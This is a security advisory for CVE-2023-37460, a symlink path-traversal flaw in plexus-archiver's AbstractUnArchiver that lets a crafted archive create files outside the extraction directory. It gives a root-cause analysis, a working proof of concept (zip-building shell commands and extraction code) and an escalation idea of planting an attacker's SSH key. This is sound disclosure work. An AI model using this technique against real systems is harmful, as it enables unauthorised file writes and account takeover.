# Arbitrary File Creation in AbstractUnArchiver

**GHSA**: GHSA-wh3p-fphp-9h2m | **CVE**: CVE-2023-37460 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-22

**Affected Packages**:
- **org.codehaus.plexus:plexus-archiver** (maven): < 4.8.0

## Description

### Summary

Using AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution.

### Description
When extracting an archive with an entry that already exists in the destination directory as a symbolic link whose target does not exist - the resolveFile() function will return the symlink's source instead of its target, which will pass the verification that ensures the file will not be extracted outside of the destination directory. Later Files.newOutputStream(), that follows symlinks by default,  will actually write the entry's content to the symlink's target.

### Impact
Whoever uses plexus archiver to extract an untrusted archive is vulnerable to an arbitrary file creation and possibly remote code execution.

### Technical Details

In [AbstractUnArchiver.java](https://github.com/codehaus-plexus/plexus-archiver/blob/plexus-archiver-4.7.1/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java#L342):
```java
protected void extractFile( final File srcF, final File dir, final InputStream compressedInputStream, String entryName, final Date entryDate, final boolean isDirectory, final Integer mode, String symlinkDestination, final FileMapper[] fileMappers)
    throws IOException, ArchiverException
    {
        ...
        // Hmm. Symlinks re-evaluate back to the original file here. Unsure if this is a good thing...
        final File targetFileName = FileUtils.resolveFile( dir, entryName );


        // Make sure that the resolved path of the extracted file doesn't escape the destination directory
        // getCanonicalFile().toPath() is used instead of getCanonicalPath() (returns String),
        // because "/opt/directory".startsWith("/opt/dir") would return false negative.
        Path canonicalDirPath = dir.getCanonicalFile().toPath();
        Path canonicalDestPath = targetFileName.getCanonicalFile().toPath();


        if ( !canonicalDestPath.startsWith( canonicalDirPath ) )
        {
            throw new ArchiverException( "Entry is outside of the target directory (" + entryName + ")" );
        }


        try
        {
            ...
            if ( !StringUtils.isEmpty( symlinkDestination ) )
            {
                SymlinkUtils.createSymbolicLink( targetFileName, new File( symlinkDestination ) );
            }
            else if ( isDirectory )
            {
                targetFileName.mkdirs();
            }
            else
            {
                try ( OutputStream out = Files.newOutputStream( targetFileName.toPath() ) )
                {
                    IOUtil.copy( compressedInputStream, out );
                }
            }


            targetFileName.setLastModified( entryDate.getTime() );


            if ( !isIgnorePermissions() && mode != null && !isDirectory )
            {
                ArchiveEntryUtils.chmod( targetFileName, mode );
            }
        }
        catch ( final FileNotFoundException ex )
        {
            getLogger().warn( "Unable to expand to file " + targetFileName.getPath() );
        }
    }
```
When given an entry that already exists in dir as a symbolic link whose target does not exist - the symbolic link’s target will be created and the content of the archive’s entry will be written to it.

That’s because the way FileUtils.resolveFile() works:
```java
public static File resolveFile( final File baseFile, String filename )
    {
        ...
        try
        {
            file = file.getCanonicalFile();
        }
        catch ( final IOException ioe )
        {
            // nop
        }


        return file;
    }
```
File.getCanonicalFile() (tested with the most recent version of openjdk (22.2) on Unix) will eventually call [JDK_Canonicalize()](https://github.com/openjdk/jdk/blob/jdk-22%2B2/src/java.base/unix/native/libjava/canonicalize_md.c#LL48C1-L68C69):
```cpp
JNIEXPORT int
JDK_Canonicalize(const char *orig, char *out, int len)
{
    if (len < PATH_MAX) {
        errno = EINVAL;
        return -1;
    }

    if (strlen(orig) > PATH_MAX) {
        errno = ENAMETOOLONG;
        return -1;
    }

    /* First try realpath() on the entire path */
    if (realpath(orig, out)) {
        /* That worked, so return it */
        collapse(out);
        return 0;
    } else {
        /* Something's bogus in the original path, so remove names from the end
           until either some subpath works or we run out of names */
        ...
```
realpath() returns the destination path for a symlink, if this destination exists. But if it doesn’t - 
it will return NULL and we will reach the else’s clause, which will eventually return the path of the symlink itself.
So in case the entry is already exists as a symbolic link to a non-existing file - file.getCanonicalFile() will return the absolute path of the symbolic link and this check will pass:
```java
Path canonicalDirPath = dir.getCanonicalFile().toPath();
Path canonicalDestPath = targetFileName.getCanonicalFile().toPath();


if ( !canonicalDestPath.startsWith( canonicalDirPath ) )
{
    throw new ArchiverException( "Entry is outside of the target directory (" + entryName + ")" );
}
```
Later, the content of the entry will be written to the symbolic link’s destination and by doing so will create the destination file and fill it with the entry’s content.

Arbitrary file creation can lead to remote code execution. For example, if there is an SSH server on the victim’s machine and ~/.ssh/authorized_keys does not exist - creating this file and filling it with an attacker's public key will allow the attacker to connect the SSH server without knowing the victim’s password.

### PoC
We created a zip as following:
```bash
$ ln -s /tmp/target entry1
$ echo -ne “content” > entry2
$ zip  --symlinks archive.zip entry1 entry2
```
The following command will change the name of entry2 to entry1:
```bash
$ sed -i 's/entry2/entry1/' archive.zip
```
We put archive.zip in /tmp and create a dir for the extracted files:
```bash
$ cp archive.zip /tmp
$ mkdir /tmp/extracted_files
```
Next, we wrote a java code that opens archive.zip:
```java
package com.example;

import java.io.File;

import org.codehaus.plexus.archiver.zip.ZipUnArchiver;

public class App 
{
    public static void main( String[] args )
    {
        ZipUnArchiver unArchiver = new ZipUnArchiver(new File("/tmp/archive.zip"));
        unArchiver.setDestDirectory(new File("/tmp/extracted_files"));
        unArchiver.extract();        
    }
}
```
After running this java code, we can see that /tmp/target contains the string “content”:
```
$ cat /tmp/target
content
```
Notice that although we used here a duplicated entry name in the same archive, this attack can be performed also by two different archives - one that contains a symlink and another archive that contains a regular file with the same entry name as the symlink.
